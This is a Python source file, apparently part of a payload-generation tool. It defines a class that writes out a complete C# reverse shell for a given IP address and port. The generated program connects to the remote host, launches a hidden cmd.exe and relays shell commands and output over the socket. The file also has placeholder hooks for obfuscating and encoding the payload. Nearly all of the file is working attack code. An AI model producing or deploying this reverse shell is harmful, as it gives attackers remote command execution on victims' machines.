from .base_generator import BaseGenerator

class CSharpGenerator(BaseGenerator):
    """C# reverse shell generator"""
    
    def generate(self, ip: str, port: int, **kwargs) -> str:
        obfuscate = kwargs.get('obfuscate', False)
        encode = kwargs.get('encode', None)
        
        template = f"""
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

class Program {{
    static void Main() {{
        using (TcpClient client = new TcpClient("{ip}", {port})) {{
            using (NetworkStream stream = client.GetStream()) {{
                using (Process process = new Process()) {{
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    
                    process.OutputDataReceived += (sender, e) => {{
                        if (!String.IsNullOrEmpty(e.Data)) {{
                            byte[] data = Encoding.ASCII.GetBytes(e.Data + "\\n");
                            stream.Write(data, 0, data.Length);
                        }}
                    }};
                    
                    process.ErrorDataReceived += (sender, e) => {{
                        if (!String.IsNullOrEmpty(e.Data)) {{
                            byte[] data = Encoding.ASCII.GetBytes(e.Data + "\\n");
                            stream.Write(data, 0, data.Length);
                        }}
                    }};
                    
                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();
                    
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0) {{
                        string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        process.StandardInput.WriteLine(command);
                    }}
                }}
            }}
        }}
    }}
}}
"""
        payload = template
        
        if obfuscate:
            payload = self._obfuscate_payload(payload)
        
        if encode:
            payload = self._encode_payload(payload, encode)
            
        return self.add_comments(payload, 'csharp')
    
    def _obfuscate_payload(self, payload: str) -> str:
        """Obfuscate C# payload"""
        # Implementation of obfuscation logic
        return payload
    
    def _encode_payload(self, payload: str, method: str) -> str:
        """Encode C# payload"""
        # Implementation of encoding logic
        return payload